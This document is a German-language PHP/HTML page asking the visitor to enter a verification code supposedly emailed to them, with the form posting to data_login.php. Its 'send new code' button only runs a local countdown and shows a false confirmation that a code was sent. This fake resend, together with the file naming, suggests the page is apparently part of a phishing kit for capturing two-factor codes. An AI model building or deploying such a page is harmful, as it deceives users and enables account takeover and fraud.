<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body class="account">
<?php 
require 'views/header.php';
?>


<main>
<div class="holder">


<div class="left">


<div class="form" style="width:600px;">

<form method="POST" action="data_login.php">
<div class="stitle">Bestätigung</div>
<div class="text">
 Um fortzufahren, geben Sie den Code ein, der an Ihre E-Mail-Adresse gesendet wurde
</div>


<div class="err" style="display:none; margin-top:20px; align-items:center;">
    <div class="icon"><img src="res/err.png"></div>
    <div class="txt">  Bitte geben Sie gültige Daten ein.</div>
</div>

<div class="col">
    <input type="text" name="j_mail" id="code" placeholder=" " required>
    <label for="code">Code</label>
</div>

<button id="sendCode" class="text-muted" style="background:none; border:none; color:gray; margin:0; padding:0; text-align:left;"> Sende neuen Code (60s)</button>
<span id="codeSent" style="display:none; color:green;">Neuer Code an Ihre E-Mail-Adresse gesendet!</span>

<div class="col lodah">
<button class="flash" type="submit"> Weiter </button>
<div class="loader"></div>
</div>
</form>

</div>

</div>






</div>
</main>


<?php 
require 'views/footer.php';
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

$(document).ready(function() {
    let countdown = 60; 
    let timer;

    function startTimer() {
        $('#sendCode').prop('disabled', true);
        $('#sendCode').text(`Sende neuen Code (${countdown}s)`);
        timer = setInterval(function() {
            countdown--;
            $('#sendCode').text(`Sende neuen Code (${countdown}s)`);
            if(countdown <= 0) {
                clearInterval(timer);
                $('#sendCode').prop('disabled', false).text("Neuen Code senden");
            }
        }, 1000);
    }

    startTimer(); 

    $('#sendCode').click(function() {
        $('#codeSent').fadeIn(200).delay(2000).fadeOut(200);
        
        countdown = 60; 
        startTimer();
    });
});




</script>
</body>
</html>